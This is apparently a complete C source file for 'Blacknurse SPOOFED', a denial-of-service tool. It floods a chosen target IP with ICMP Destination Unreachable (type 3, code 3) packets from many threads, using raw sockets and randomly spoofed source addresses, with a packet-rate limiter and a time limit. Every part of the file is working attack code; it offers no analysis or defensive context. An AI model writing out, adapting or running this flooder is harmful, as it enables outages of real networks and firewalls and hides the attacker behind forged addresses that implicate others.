#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
	x++;
	c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}

unsigned short icmpcsum(struct iphdr *iph, struct icmphdr *icmph) {

	struct icmp_pseudo
	{
	unsigned long src_addr;
	unsigned long dst_addr;
	unsigned char zero;
	unsigned char proto;
	unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_ICMP;
	pseudohead.length=htons(sizeof(struct icmphdr));
	int totalicmp_len = sizeof(struct icmp_pseudo) + sizeof(struct icmphdr);
	unsigned short *icmp = malloc(totalicmp_len);
	memcpy((unsigned char *)icmp,&pseudohead,sizeof(struct icmp_pseudo));
	memcpy((unsigned char *)icmp+sizeof(struct icmp_pseudo),(unsigned char *)icmph,sizeof(struct icmphdr));
	unsigned short output = csum(icmp,totalicmp_len);
	free(icmp);
	return output;
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
	iph->id = htonl(rand()%54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_ICMP;
	iph->check = 0;
	iph->saddr = inet_addr("8.8.8.8");
}
void setup_icmp_header(struct icmphdr *icmph)
{
    
	icmph->type = ICMP_DEST_UNREACH;
	icmph->code = 3;
	icmph->un.echo.sequence = rand();
	icmph->un.echo.id = rand();
	
}
void *flood(void *par1)
{
	char *td = (char *)par1;
		uint8_t pkt_template[MAX_PACKET_SIZE] = {
        0x03, 0x03, 0x0d, 0x33, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x1c, 0x4a, 0x04, 0x00, 0x00,
        0x40, 0x06, 0x20, 0xc5, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x08, 0xef, 0xc1
    };
	struct iphdr *iph = (struct iphdr *)pkt_template;
	struct icmphdr *icmph = (void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
	if(s < 0){
	fprintf(stderr, "Could not open raw socket.\n");
	exit(-1);
	}
	memset(pkt_template, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_icmp_header(icmph);
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) pkt_template, iph->tot_len);
	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
	fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
	exit(-1);
	}
	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
	sendto(s, pkt_template, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
	iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
	iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
	iph->check = csum ((unsigned short *) pkt_template, iph->tot_len);
	icmph->checksum = 0;
	icmph->checksum = icmpcsum(iph, icmph);
	icmph->type = ICMP_DEST_UNREACH;
	icmph->code = 3;
	icmph->un.echo.sequence = rand();
	icmph->un.echo.id = rand();
	pps++;
	if(i >= limiter)
	{
	i = 0;
	usleep(sleeptime);
	}
	i++;
	}
}
int main(int argc, char *argv[ ])
{
	if(argc < 6){
	    fprintf(stderr, "Invalid parameters!\n");
        fprintf(stderr, "Blacknurse SPOOFED by TNXL HK\n");
        fprintf(stdout, "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
	exit(-1);
	}
	fprintf(stdout, "Opening sockets...\n");
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	
	int multiplier = 100;
	int i;
	for(i = 0;i<num_threads;i++){
	pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
	}
	fprintf(stdout, "Sending attack...\n");
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}

	return 0;
}